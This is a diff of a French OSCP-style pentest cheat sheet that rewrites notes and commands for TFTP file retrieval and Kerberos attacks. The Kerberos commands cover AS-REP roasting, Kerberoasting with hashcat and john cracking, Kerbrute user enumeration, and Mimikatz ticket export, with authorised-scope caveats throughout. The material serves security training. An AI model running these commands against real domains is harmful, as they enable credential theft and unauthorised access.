@@ -1003,7 +1003,7 @@ dig @<SERVEUR_DNS> <DOMAINE> AXFR
 
 Transférer ou récupérer des fichiers dans le laboratoire.
 
-<p class="oscp-command-note">Nmap (TFTP) : lancer les scripts NSE « tftp-enum ».</p>
+<p class="oscp-command-note">Nmap TFTP : tester les noms de fichiers connus via tftp-enum sur UDP 69 ; pas de liste exhaustive garantie.</p>
 
 ```bash
 sudo nmap -sU -p 69 --script tftp-enum <IP_CIBLE>
@@ -1017,7 +1017,7 @@ sudo nmap -sU -p 69 --script tftp-enum <IP_CIBLE>
 
 ```
 
-<p class="oscp-command-note">Script Bash d’énumération TFTP : vérifier la présence d’un fichier connu.</p>
+<p class="oscp-command-note">Bash TFTP : tenter de télécharger un fichier connu ; vérifier le succès du transfert, pas seulement sa présence locale.</p>
 
 ```bash
 #!/bin/bash
@@ -1031,21 +1031,25 @@ fi
 TARGET_IP=$1
 FILENAME=$2
 
-# Tenter de récupérer le fichier du serveur TFTP
+# Tenter de récupérer le fichier du serveur TFTP dans un répertoire temporaire isolé
 echo "Tentative de téléchargement de $FILENAME depuis $TARGET_IP"
+if [ -e "$FILENAME" ]; then
+    echo "Le fichier local existe déjà : utiliser un répertoire vide pour éviter les faux positifs" >&2
+    exit 1
+fi
 tftp "$TARGET_IP" -c get "$FILENAME"
 
-# Vérifier si le fichier existe localement (un ancien fichier peut fausser le résultat)
-if [ -f "$FILENAME" ]; then
-    echo "Fichier $FILENAME présent localement après la requête TFTP"
+# Vérifier le code retour du client TFTP et la présence du fichier téléchargé
+if [ "$?" -eq 0 ] && [ -f "$FILENAME" ]; then
+    echo "Téléchargement terminé : $FILENAME (vérifier son contenu)"
 else
-    echo "Fichier $FILENAME absent : transfert échoué ou fichier indisponible"
+    echo "Transfert TFTP échoué ou fichier indisponible : $FILENAME"
 fi
 
 ```
 
 ```bash
-# Interroger le service TFTP
+# Dans le terminal, lancer le client TFTP ; les lignes suivantes sont à saisir dans son invite :
 tftp 192.0.2.10
 get fichier_distant fichier_local
 quit
@@ -1053,21 +1057,21 @@ quit
 ```
 
 ```bash
-# Interroger le service TFTP
+# Dans le terminal, lancer le client TFTP ; les lignes suivantes sont à saisir dans son invite :
 tftp 192.0.2.10
 put fichier_local fichier_distant
 quit
 
 ```
 
-<p class="oscp-command-note">Parcourir une liste de noms de fichiers TFTP à télécharger ; la boucle ne découvre pas d'hôtes.</p>
+<p class="oscp-command-note">TFTP : essayer chaque nom de fichier de la liste sur un serveur connu ; aucun parcours distant automatique.</p>
 
 ```bash
 while IFS= read -r fichier; do [ -n "$fichier" ] && tftp 192.0.2.10 -c get "$fichier"; done < liste_fichiers.txt
 
 ```
 
-<p class="oscp-command-note">Transmettre des instructions de téléchargement ou d'envoi à TFTP.</p>
+<p class="oscp-command-note">TFTP : transmettre get ou put à l'invite interactive via stdin ; vérifier le client installé.</p>
 
 ```bash
 printf 'get fichier_distant fichier_local\nquit\n' | tftp 192.0.2.10
@@ -1079,14 +1083,14 @@ printf 'put fichier_local fichier_distant\nquit\n' | tftp 192.0.2.10
 
 Examiner les objets, les droits et les services du domaine.
 
-<p class="oscp-command-note">Kerberos : détecter TCP 88 puis tenter l'énumération avec krb5-enum-users (script et paramètres à vérifier).</p>
+<p class="oscp-command-note">Kerberos : identifier TCP 88 ; krb5-enum-users nécessite une liste de noms et le domaine cible.</p>
 
 ```bash
 # Identifier le service Kerberos sur TCP 88 ; UDP 88 peut également être utilisé
 nmap -sV -p 88 <IP_CIBLE>
 
 # Tester l'énumération d'utilisateurs uniquement dans le périmètre autorisé ; nécessite un domaine et des noms candidats
-nmap -p 88 --script krb5-enum-users <IP_CIBLE>
+nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm=EXEMPLE.LOCAL,userdb=utilisateurs.txt <IP_CIBLE>
 
 ```
 
@@ -1099,14 +1103,14 @@ kerbrute userenum --dc <IP_DC> -d <DOMAINE> liste_utilisateurs.txt
 
 ```
 
-<p class="oscp-command-note">Examiner les comptes sans préauthentification Kerberos.</p>
+<p class="oscp-command-note">AS-REP roasting : demander les réponses pour les comptes sans préauthentification du domaine autorisé.</p>
 
 ```bash
 impacket-GetNPUsers -dc-ip <IP_DC> -request -usersfile liste_utilisateurs.txt <DOMAINE>/
 
 ```
 
-<p class="oscp-command-note">Demander un ticket Kerberos TGT.</p>
+<p class="oscp-command-note">Impacket getTGT : demander un TGT avec un compte du domaine et un mot de passe autorisés.</p>
 
 ```bash
 impacket-getTGT -dc-ip <IP_DC> <DOMAINE>/<UTILISATEUR>
@@ -1122,7 +1126,7 @@ hashcat -m 13100 tickets_tgs.hash liste_mots_de_passe.txt
 
 ```
 
-<p class="oscp-command-note">Kerberos : demander des tickets d'authentification de test.</p>
+<p class="oscp-command-note">Kerberos : distinguer TGT (getTGT) et ticket de service SPN (getST) avec des identifiants autorisés.</p>
 
 ```bash
 # Demander un TGT Kerberos avec des identifiants autorisés
@@ -1133,13 +1137,13 @@ impacket-getST -dc-ip <IP_DC> -spn <SERVICE>/<HOTE> <DOMAINE>/<UTILISATEUR>
 
 ```
 
-<p class="oscp-command-note">Énumérer les SPN des comptes de service.</p>
+<p class="oscp-command-note">Impacket GetUserSPNs : demander des TGS pour les comptes de service accessibles ; cracking hors ligne ensuite.</p>
 
 ```bash
-# Extraire les tickets de service pour une attaque hors ligne (offline cracking)
+# Demander les TGS des SPN accessibles et enregistrer leurs empreintes pour une analyse hors ligne
 impacket-GetUserSPNs -dc-ip <dc_ip> -outputfile <tickets_file> <domain>/<username>:<password>
 
-# Casser les mots de passe des tickets extraits avec John the Ripper ou Hashcat
+# Tester hors ligne les empreintes de tickets avec John ou Hashcat selon leur type
 john --wordlist=<wordlist> <tickets_file>
 # Ou
 hashcat -m 13100 <tickets_file> <wordlist>
@@ -1163,7 +1167,7 @@ impacket-getTGT -dc-ip 192.0.2.10 exemple.local/utilisateur
 
 ```
 
-<p class="oscp-command-note">Analyser les informations d’authentification avec Mimikatz.</p>
+<p class="oscp-command-note">Mimikatz : exporter les tickets Kerberos accessibles en mémoire ; nécessite des privilèges élevés.</p>
 
 ```powershell
 # Exporter les tickets accessibles avec les droits nécessaires (commande sensible)
@@ -1171,7 +1175,7 @@ mimikatz "sekurlsa::tickets /export"
 
 ```
 
-<p class="oscp-command-note">Kerberos : tester les noms de comptes du domaine avec Kerbrute.</p>
+<p class="oscp-command-note">Kerbrute : tester une liste de noms sur le contrôleur de domaine spécifié, sans mot de passe.</p>
 
 ```bash
 # Énumérer les utilisateurs Kerberos autorisés avec le binaire Kerbrute
@@ -1186,14 +1190,14 @@ klist
 
 ```
 
-<p class="oscp-command-note">Linux : demander un TGT de test avec Impacket ; la commande atexec historique était incorrecte et a été retirée.</p>
+<p class="oscp-command-note">Linux : demander un TGT Kerberos avec Impacket et un compte de laboratoire.</p>
 
 ```bash
 impacket-getTGT -dc-ip 192.0.2.10 exemple.local/utilisateur
 
 ```
 
-<p class="oscp-command-note">Windows : afficher les tickets Kerberos en cache (l'ancienne commande de création de ticket était invalide).</p>
+<p class="oscp-command-note">Windows : afficher les tickets Kerberos actuellement présents dans le cache avec klist tickets.</p>
 
 ```powershell
 klist tickets
